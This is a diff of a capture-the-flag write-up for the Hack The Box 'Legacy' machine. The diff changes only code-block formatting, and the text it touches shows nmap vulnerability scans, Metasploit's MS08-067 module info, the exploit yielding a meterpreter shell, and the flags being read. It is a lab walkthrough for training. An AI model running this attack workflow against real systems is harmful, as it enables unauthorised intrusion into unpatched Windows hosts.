@@ -15,7 +15,8 @@ this scan is a bit like `-A`, it runs all the default nse scripts on the host, a
 service information.
 
 
-{% highlight ruby %}
+```
+
  Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-06 13:01 GMT
 Nmap scan report for 10.10.10.4
 Host is up (0.12s latency).
@@ -42,11 +43,13 @@ Host script results:
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
-{% endhighlight %}
+
+```
 
 Ok, lets home in on the discovered ports...
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/prep/legacy# nmap -p139,445 -sSV 10.10.10.4 --script=vuln
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-06 13:17 GMT
 Nmap scan report for 10.10.10.4
@@ -89,14 +92,15 @@ Host script results:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 
-{% endhighlight %}
+```
 
 Looks like this target is vulnerable to the old smb ms08_067_netapi exploit, and also the infamous ms17-010 EternalBlue exploit.
 In this instence we're going to try the older netapi one, we'll keep the devistating EternalBlue for another box...
 
 In the msfconsole we can use the `info` command to ...well...get more info!
 
-{% highlight ruby %}
+```
+
 msf5 exploit(windows/smb/ms08_067_netapi) > info
 
        Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
@@ -145,12 +149,13 @@ References:
   http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos
 
 
-{% endhighlight %}
+```
 
 Use the default payload with this one, no need to use the `set payload` command.
 triggering the `exploit` gives us a meterpreter shell.
 
-{% highlight ruby %}
+```
+
 meterpreter > ipconfig
 
 Interface  1
@@ -179,11 +184,13 @@ Logged On Users : 1
 Meterpreter     : x86/windows
 meterpreter > cat root.txt
 # 99xxxxxxxxxxxxxxxxxxxxxxxxx3
-{% endhighlight %}
+
+```
 
 This exploit is impressive, we already have elevated privilages, and can access both the user and Administrator(root) flags.
 
-{% highlight ruby %}
+```
+
 meterpreter > dir
 Listing: C:\Documents and Settings\john\desktop
 ===============================================
@@ -194,8 +201,8 @@ Mode              Size  Type  Last modified              Name
 
 meterpreter > cat user.txt
 # exxxxxxxxxxxxxxxxxxxxxxxxxf
-{% endhighlight %}
 
+```
 
 1. scan Target
 2. identify vulnerabilities
